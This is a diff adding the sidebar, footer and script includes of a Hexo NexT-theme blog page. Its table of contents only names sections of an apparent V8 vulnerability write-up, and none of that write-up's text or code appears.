+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">11</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  
+                    
+                      <a href="/categories/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">6</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                      <a href="/tags/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">4</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://github.com/erosjohn" title="GitHub &rarr; https://github.com/erosjohn" rel="noopener" target="_blank"><i class="fa fa-fw fa-globe"></i>GitHub</a>
+                </span>
+              
+            </div>
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#环境准备"><span class="nav-number">1.</span> <span class="nav-text">环境准备</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞分析"><span class="nav-number">2.</span> <span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Patch"><span class="nav-number">2.1.</span> <span class="nav-text">Patch</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CheckBound优化流程"><span class="nav-number">2.2.</span> <span class="nav-text">CheckBound优化流程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#POC"><span class="nav-number">2.3.</span> <span class="nav-text">POC</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#虚假的POC"><span class="nav-number">2.3.1.</span> <span class="nav-text">虚假的POC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#真正的POC"><span class="nav-number">2.3.2.</span> <span class="nav-text">真正的POC</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#方法1"><span class="nav-number">2.3.2.1.</span> <span class="nav-text">方法1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#方法2"><span class="nav-number">2.3.2.2.</span> <span class="nav-text">方法2</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞利用"><span class="nav-number">3.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#利用思路"><span class="nav-number">3.1.</span> <span class="nav-text">利用思路</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#构造addrOf原语"><span class="nav-number">3.1.1.</span> <span class="nav-text">构造addrOf原语</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#构造完整的OOB利用"><span class="nav-number">3.1.2.</span> <span class="nav-text">构造完整的OOB利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#构造任意地址读写"><span class="nav-number">3.1.3.</span> <span class="nav-text">构造任意地址读写</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#wasm"><span class="nav-number">3.1.4.</span> <span class="nav-text">wasm</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit"><span class="nav-number">3.2.</span> <span class="nav-text">Exploit</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考链接"><span class="nav-number">4.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Eros John</span>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/utils.js?v=7.1.0"></script>
+
+  <script src="/js/motion.js?v=7.1.0"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/affix.js?v=7.1.0"></script>
+
+  <script src="/js/schemes/pisces.js?v=7.1.0"></script>
+
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.1.0"></script>
+<script src="/js/post-details.js?v=7.1.0"></script>
+
+
+
+  
+
+
+  <script src="/js/next-boot.js?v=7.1.0"></script>
+
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+
+  
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
